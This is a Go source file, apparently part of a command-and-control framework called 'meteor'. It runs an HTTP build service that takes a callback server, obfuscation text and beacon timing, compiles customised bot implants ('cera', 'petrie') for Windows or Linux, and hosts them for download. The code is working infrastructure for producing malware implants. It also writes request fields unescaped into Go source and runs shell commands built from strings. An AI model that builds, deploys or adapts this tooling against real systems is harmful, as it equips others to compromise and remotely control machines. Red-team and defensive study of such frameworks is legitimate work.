// The "nest" is the client builder that will listen on an endpoint for client configurations, then compile a client and host it for download
package main

import (
	"encoding/json"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// ValidClients is a ist of bot clients that have src code written (note: commander clients are not valid, only actual "bots")
var ValidClients = []string{"cera", "petrie"}

// BuildReq is the struct that holds the required fields for requesting a new client build
type BuildReq struct {
	ClientName string
	Server     string
	RegFile    string
	ObfText    string
	Interval   string
	Delta      string
	TargetOS   string
}

func main() {
	http.HandleFunc("/", status)
	http.HandleFunc("/status", status)
	http.HandleFunc("/buildreq", handleBuildReq)
	fs := http.FileServer(http.Dir("/hostedfiles"))
	http.Handle("/files/", http.StripPrefix("/files/", fs))
	log.Fatal(http.ListenAndServe(":45678", nil))
	return
}

func status(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Nest is running...\n"))
}

func handleBuildReq(w http.ResponseWriter, r *http.Request) {
	var br BuildReq
	err := json.NewDecoder(r.Body).Decode(&br)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	if br.ClientName == "" || br.Server == "" || br.RegFile == "" || br.ObfText == "" || br.Interval == "" || br.Delta == "" || br.TargetOS == "" {
		http.Error(w, "Missing parameter", http.StatusBadRequest)
	}
	stat, binLoc := buildClient(br)
	if stat == 200 {
		binLoc = "File located at <server>/files/" + binLoc
	}
	bod, _ := json.Marshal(map[string]string{
		"msg": binLoc,
	})
	w.Write(bod)

}

func buildClient(br BuildReq) (int, string) {
	newID := genRando()
	validCli := stringInSlice(br.ClientName, ValidClients)
	if validCli == false {
		return 400, "400 - Invalid client name: '" + br.ClientName + "'"
	}
	if br.TargetOS != "windows" && br.TargetOS != "linux" {
		return 400, "400 - Invalid TargetOS: '" + br.TargetOS + "' . Must be: 'linux' or 'windows'."
	}
	cpCom := "cp -r /go/src/github.com/degenerat3/meteor/meteor/clients/" + br.ClientName + " /go/src/github.com/degenerat3/meteor/meteor/clients/" + newID
	c := exec.Command("/bin/sh", "-c", cpCom)
	err := c.Run()
	if err != nil {
		return 500, "500 - error copying files"
	}
	replaceAttributes(br, newID)
	newEnv := "export GOOS=" + br.TargetOS
	compileCom := newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/clients/" + newID + "; go build -o outBin; cp outBin /hostedfiles/" + newID + ";"
	c = exec.Command("/bin/sh", "-c", compileCom)
	err = c.Run()
	if err != nil {
		return 500, "500 - error compiling new files"
	}
	cleanUpCom := "rm -rf /go/src/github.com/degenerat3/meteor/meteor/clients/" + newID
	c = exec.Command("/bin/sh", "-c", cleanUpCom)
	err = c.Run()
	if err != nil {
		return 500, "500 - error removing files"
	}
	return 200, newID
}

func genRando() string {
	rand.Seed(time.Now().UnixNano())
	chars := []rune("abcdefghijklmnopqrstuvwxyz" +
		"0123456789")
	length := 6
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	str := b.String()
	return str
}

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func replaceAttributes(br BuildReq, newID string) {
	path := "/go/src/github.com/degenerat3/meteor/meteor/clients/" + newID + "/" + br.ClientName + ".go"
	read, _ := ioutil.ReadFile(path)
	newContents := strings.Replace(string(read), "$$SERVER$$", br.Server, -1)
	newContents = strings.Replace(string(newContents), "$$REGFILE$$", br.RegFile, -1)
	newContents = strings.Replace(string(newContents), "$$OBFTEXT$$", br.ObfText, -1)
	newContents = strings.Replace(string(newContents), "1234123499", br.Interval, -1)
	newContents = strings.Replace(string(newContents), "4321432199", br.Delta, -1)
	ioutil.WriteFile(path, []byte(newContents), 0)
	return

}
